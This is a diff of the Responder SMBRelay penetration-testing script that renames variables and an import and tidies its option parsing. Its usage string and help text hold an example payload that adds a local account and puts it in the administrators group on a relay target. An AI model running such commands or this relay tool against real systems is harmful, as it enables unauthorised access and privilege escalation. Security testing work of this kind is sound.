@@ -15,7 +15,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import sys, os, struct,re,socket,random, RelayPackets,optparse,thread
-from FingerprintRelay import RunSmbFinger
+from fingerprint import RunSmbFinger
 from odict import OrderedDict
 from socket import *
 from RelayPackets import *
@@ -29,17 +29,11 @@ def UserCallBack(op, value, dmy, parser):
         args.extend(getattr(parser.values, op.dest))
     setattr(parser.values, op.dest, args)
 
-parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin",
-                               prog=sys.argv[0],
-                               )
-parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
-
+parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin", prog=sys.argv[0],)
+parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="Responder_IP")
 parser.add_option('-c',action='store', help='Command to run on the target.',metavar='"net user Responder Quol0eeP/e}X /ADD"',dest='CMD')
-
 parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
-
 parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials. Woks on NTLMv1",metavar="WORKGROUP",dest="Domain")
-
 parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")
 
 options, args = parser.parse_args()
@@ -65,7 +59,7 @@ UserToRelay = options.UserToRelay
 Domain  = options.Domain
 Command  = options.CMD
 Target = options.TARGET
-OURIP = options.OURIP
+Responder_IP = options.Responder_IP
 
 print "\nResponder SMBRelay 0.1\nPlease send bugs/comments to: lgaffie@trustwave.com"
 print '\033[31m'+'Use this script in combination with Responder.py for best results (remember to set SMB = Off in Responder.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
